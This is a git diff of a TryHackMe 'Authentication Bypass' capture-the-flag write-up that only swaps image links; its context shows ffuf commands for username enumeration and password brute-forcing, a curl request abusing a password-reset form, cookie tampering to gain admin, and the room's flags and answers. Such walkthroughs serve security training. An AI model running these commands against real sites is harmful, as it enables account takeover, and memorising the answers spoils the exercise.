@@ -1,7 +1,7 @@
-![Authentication Bypass Banner](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/authenticationbypass/Authentication_Bypass_Banner.png)
+![Authentication Bypass Banner](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/authenticationbypass/Authentication_Bypass_Banner.png)
 
 <p align="center">
-   <img src="https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/authenticationbypass/Authentication_Bypass_Cover.png" alt="Authentication Bypass Logo">
+   <img src="https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/authenticationbypass/Authentication_Bypass_Cover.png" alt="Authentication Bypass Logo">
 </p>
 
 # Authentication Bypass
@@ -21,17 +21,17 @@ This guide contains the answer and steps necessary to get to them for the [Authe
 
    We have a form which seems to leak more information than we should.
    
-   ![Exists](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/authenticationbypass/Authentication_Bypass_Enumeration_Exists.png)
+   ![Exists](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/authenticationbypass/Authentication_Bypass_Enumeration_Exists.png)
    
    To abuse the fact that a result is returned when the username already exists we can use ffuf with the following commands and names takes from the source page:
    
-   ![Source](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/authenticationbypass/Authentication_Bypass_Enumeration_Source.png)
+   ![Source](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/authenticationbypass/Authentication_Bypass_Enumeration_Source.png)
    
    ```cmd
    ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.47.167/customers/signup -mr "username already exists"
    ```
 
-   ![Users](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/authenticationbypass/Authentication_Bypass_Enumeration_Users.png)
+   ![Users](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/authenticationbypass/Authentication_Bypass_Enumeration_Users.png)
 
    ><details><summary>Click for answer</summary>Simon</details>
 
@@ -57,7 +57,7 @@ This guide contains the answer and steps necessary to get to them for the [Authe
    ffuf -w usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.47.167/customers/login -fc 200  
    ```
 
-   ![Password](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/authenticationbypass/Authentication_Bypass_Brute_Force_Password.png)
+   ![Password](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/authenticationbypass/Authentication_Bypass_Brute_Force_Password.png)
 
    ><details><summary>Click for answer</summary>steve/thunder</details>
 
@@ -67,7 +67,7 @@ This guide contains the answer and steps necessary to get to them for the [Authe
 
    The following form allows us to reset someones password and send the email to us.
    
-   ![Form](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/authenticationbypass/Authentication_Bypass_Logic_Form.png)
+   ![Form](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/authenticationbypass/Authentication_Bypass_Logic_Form.png)
    
    ```cmd
    curl "http://10.10.47.167/customers/reset?email=robert@acmeitsupport.thm" -H "Content-Type: application/x-www-form-urlencoded" -d "username=robert&email=1337h4ck3r@customer.acmeitsupport.thm"
@@ -75,11 +75,11 @@ This guide contains the answer and steps necessary to get to them for the [Authe
 
    Here we receive the ticket to log into the account.
    
-   ![Ticket](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/authenticationbypass/Authentication_Bypass_Logic_Ticket.png)
+   ![Ticket](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/authenticationbypass/Authentication_Bypass_Logic_Ticket.png)
    
    And now we can access the flag on Roberts account.
    
-   ![Flag](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/authenticationbypass/Authentication_Bypass_Logic_Flag.png)
+   ![Flag](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/authenticationbypass/Authentication_Bypass_Logic_Flag.png)
    
    ><details><summary>Click for answer</summary>THM{AUTH_BYPASS_COMPLETE}</details>
 
@@ -99,7 +99,7 @@ This guide contains the answer and steps necessary to get to them for the [Authe
    curl http://10.10.47.167/cookie-test -H "Cookie: logged_in=true; admin=true"
    ```
    
-   ![Admin](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/authenticationbypass/Authentication_Bypass_Cookie_Admin.png)
+   ![Admin](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/authenticationbypass/Authentication_Bypass_Cookie_Admin.png)
    
    ><details><summary>Click for answer</summary>THM{COOKIE_TAMPERING}</details>
 
@@ -107,7 +107,7 @@ This guide contains the answer and steps necessary to get to them for the [Authe
 
    Using crackstation, we can get the string belonging to this hash.
    
-   ![MD5](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/authenticationbypass/Authentication_Bypass_Cookie_MD5.jpeg)
+   ![MD5](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/authenticationbypass/Authentication_Bypass_Cookie_MD5.jpeg)
 
    ><details><summary>Click for answer</summary>463729</details>
 
@@ -115,7 +115,7 @@ This guide contains the answer and steps necessary to get to them for the [Authe
 
    To decode a Base64 strings we can use CyberChef.
    
-   ![Base 64](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/authenticationbypass/Authentication_Bypass_Cookie_Base_64.png)
+   ![Base 64](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/authenticationbypass/Authentication_Bypass_Cookie_Base_64.png)
 
    ><details><summary>Click for answer</summary>THM{BASE64_ENCODING}</details>
 
